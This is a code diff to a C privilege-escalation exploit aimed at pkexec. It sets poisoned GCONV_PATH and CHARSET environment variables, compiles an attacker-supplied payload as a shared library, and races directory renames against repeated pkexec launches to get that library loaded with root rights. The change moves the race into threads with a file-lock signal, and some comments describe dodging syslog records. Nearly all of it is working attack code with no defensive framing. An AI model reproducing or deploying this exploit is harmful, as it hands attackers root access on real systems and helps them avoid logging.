@@ -1,10 +1,22 @@
 #include <fcntl.h>
+#include <pthread.h>
 #include <signal.h>
+#include <stdatomic.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/file.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <unistd.h>
+
+static char *pk_path = "/usr/bin/pkexec";
+static char *pk_args[] = {NULL};
+static char *pk_envs[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC",
+                          NULL};
+
+pthread_mutex_t exec_mut;
+pthread_cond_t exec_cond;
+atomic_int halt = 0;
 
 void read_payload(char *payload_file, char **payload_contents) {
   FILE *pfp = NULL;
@@ -62,7 +74,8 @@ void setup(char *payload_file) {
     exit(1);
   }
 
-  system("rm g2g");
+  // remove existing file lock
+  system("rm -f /tmp/g2g");
 
   // GCONV_PATH setup
   mkdir("GCONV_PATH=.", 0700);
@@ -82,22 +95,40 @@ void setup(char *payload_file) {
   system("gcc -o privesc/privesc.so -shared -fPIC privesc/privesc.c ");
 }
 
-void race() {
-  // keep racing while payload didnt trigger
-  for (; 0 != access("g2g", F_OK);) {
+void *race() {
+  for (; 0 == halt;) {
     rename("GCONV_PATH=./privesc", "GCONV_PATH=./race");
     rename("GCONV_PATH=./race", "GCONV_PATH=./privesc");
   }
 }
 
+void *pwn() {
+  int lfd = open("/tmp/g2g", O_CREAT);
+
+  // simple file lock; payload grabs lock on good run
+  for (; 0 == flock(lfd, LOCK_EX | LOCK_NB);) {
+    flock(lfd, LOCK_UN);
+    if (0 == fork()) {
+      // execve must be run in process with parent 1 to avoid syslog
+      if (0 == fork()) {
+        execve(pk_path, pk_args, pk_envs);
+      }
+      exit(EXIT_FAILURE);
+    }
+  }
+
+  // stop race thread
+  // block while other poisned execve runs
+  halt = 1;
+  while (0 != flock(lfd, LOCK_EX)) {
+    usleep(1000);
+  }
+}
+
 int main(int argc, char *argv[]) {
   int ret = 0;
-  pid_t pkid, rid, w = 0;
-  int wstatus = 0;
-  char *pk_path = "/usr/bin/pkexec";
-
-  char *args[] = {NULL};
-  char *env[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC", NULL};
+  pthread_t pwn_id = 0;
+  pthread_t race_id = 0;
 
   if (argc < 2 || argv[1] == NULL) {
     fprintf(stderr, "[-] Need Payload C File for Malicious SO\n");
@@ -107,35 +138,18 @@ int main(int argc, char *argv[]) {
 
   setup(argv[1]);
 
-  // start race condition setup
-  if (0 == fork()) {
-    race();
-  }
+  pthread_mutex_init(&exec_mut, NULL);
+  pthread_mutex_lock(&exec_mut);
 
-  // loop to keep attempting to win race
-  for (;;) {
-    // if the payload triggered stop attempting
-    if (0 == access("g2g", F_OK)) {
-      usleep(1000);
-      break;
-    }
-    // need to fork again since execve replaces the process
-    if (0 == fork()) {
-      // fork again to avoid the syslog nonauth error
-      // instead will go down the "dead parent" error path
-      if (0 == fork()) {
-        execve(pk_path, args, env);
-      } else {
-        exit(EXIT_FAILURE);
-      }
-    }
-  }
+  // start thread to cause race condition
+  pthread_create(&race_id, NULL, race, NULL);
 
-  // remain open so the payload keeps running
-  // need CTRL-C after exiting payload
-  do {
-    usleep(1000);
-  } while (1);
+  // race condition exploitation
+  pthread_create(&pwn_id, NULL, pwn, NULL);
+
+  // join threads
+  pthread_join(pwn_id, NULL);
+  pthread_join(race_id, NULL);
 
 exit:
   return ret;
